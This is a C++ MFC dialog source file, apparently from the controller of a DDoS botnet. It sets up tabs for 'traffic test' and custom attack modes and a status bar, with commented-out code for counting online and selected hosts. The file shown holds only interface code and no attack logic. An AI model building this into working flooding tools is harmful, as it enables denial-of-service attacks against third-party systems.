// DDOSAttackDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "DDOSAttackDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CDDOSAttackDlg dialog


CDDOSAttackDlg::CDDOSAttackDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CDDOSAttackDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CDDOSAttackDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	Point = NULL;
}


void CDDOSAttackDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CDDOSAttackDlg)
	DDX_Control(pDX, IDC_DDOS_ATTACK, m_TabCtrl);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CDDOSAttackDlg, CDialog)
	//{{AFX_MSG_MAP(CDDOSAttackDlg)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_NOTIFY(TCN_SELCHANGE, IDC_DDOS_ATTACK, OnSelchangeDdosAttack)
	ON_WM_SHOWWINDOW()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CDDOSAttackDlg message handlers

void CDDOSAttackDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	ShowWindow(SW_HIDE);
}

void CDDOSAttackDlg::OnCancel()
{
	ShowWindow(SW_HIDE);
}


#define  ID_STATUS_UID 0x1300001

void CDDOSAttackDlg::StatusTextOut(int iPane,LPCTSTR ptzFormat, ...)
{
	TCHAR tzText[1024];
	
	va_list vlArgs;
	va_start(vlArgs, ptzFormat);
	wvsprintf(tzText, ptzFormat, vlArgs);
	va_end(vlArgs);
	
	m_wndStatusBar.SetText(tzText, iPane, 0);
}

VOID CDDOSAttackDlg::InitailizeStatus()
{
	m_wndStatusBar.Create(WS_CHILD|WS_VISIBLE|CCS_BOTTOM|CCS_TOP|SBARS_SIZEGRIP,CRect(0,0,0,0),this,ID_STATUS_UID);
	CRect rect;
    m_wndStatusBar.GetClientRect(&rect);
    int a[3]= {rect.right/1, (rect.right/4)*2+150, -1 };
    m_wndStatusBar.SetParts(1,a);

}

BOOL CDDOSAttackDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	// TODO: Add extra initialization here
	if(Point==NULL)
	{
		MessageBox("初始化失败!");
		return TRUE;
	}
	
// 	SetIcon(AfxGetApp()->LoadIcon(IDI_ICON_DDOS),FALSE);
// 	SetIcon(AfxGetApp()->LoadIcon(IDI_ICON_DDOS),TRUE);

	m_TabCtrl.InsertItem(0,"常规流量测试");
	m_TabCtrl.InsertItem(1,"自定义模式");
	m_TabCtrl.SetCurSel(0);

	m_WebAttack.Point = this;
	m_WebAttack.ViewPoint = Point;
	m_FlowAttack.Point =this;
	m_FlowAttack.ViewPoint = Point;

	m_WebAttack.Create(IDD_FLOWATTACK_DIALOG,GetDlgItem(IDC_DDOS_ATTACK));
	m_FlowAttack.Create(IDD_CUSTOMATTACK_DIALOG,GetDlgItem(IDC_DDOS_ATTACK));

	RECT TabRect;
	m_TabCtrl.GetClientRect(&TabRect);

	TabRect.top+=20;

	m_WebAttack.MoveWindow(&TabRect);
	m_WebAttack.ShowWindow(SW_SHOW);

	m_FlowAttack.MoveWindow(&TabRect);
	m_FlowAttack.ShowWindow(SW_HIDE);
	InitailizeStatus();

	StatusTextOut(0,"暂无任务");
	

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CDDOSAttackDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	RECT TabRect;
	GetClientRect(&TabRect);
	m_TabCtrl.MoveWindow(&TabRect);
	TabRect.top+=20;
	TabRect.bottom-=24;

	m_WebAttack.MoveWindow(&TabRect);
	m_FlowAttack.MoveWindow(&TabRect);

	TabRect.bottom+=40;
	m_wndStatusBar.MoveWindow(&TabRect);
}

void CDDOSAttackDlg::OnSelchangeDdosAttack(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	switch(m_TabCtrl.GetCurSel())
	{
	case 0:
		m_WebAttack.ShowWindow(SW_SHOW);
		m_FlowAttack.ShowWindow(SW_HIDE);
		break;
	case 1:
		m_FlowAttack.ShowWindow(SW_SHOW);
		m_WebAttack.ShowWindow(SW_HIDE);
		
		break;
	}
	*pResult = 0;
}

void CDDOSAttackDlg::OnShowWindow(BOOL bShow, UINT nStatus) 
{
	CDialog::OnShowWindow(bShow, nStatus);
	
	// TODO: Add your message handler code here
	//更新下在线主机
// 	DWORD AllHost=0;
// 	DWORD SelectHost=0;
// 
// 	Point->GetHostNums(AllHost,SelectHost);
// 
// 	CString Temp;
// 	Temp.Format("当前在线主机 %d 台",AllHost);
// 	StatusTextOut(1,Temp.GetBuffer(0));
// 	Temp.Format("当前选中主机 %d 台",SelectHost);
// 	StatusTextOut(2,Temp.GetBuffer(0));
}
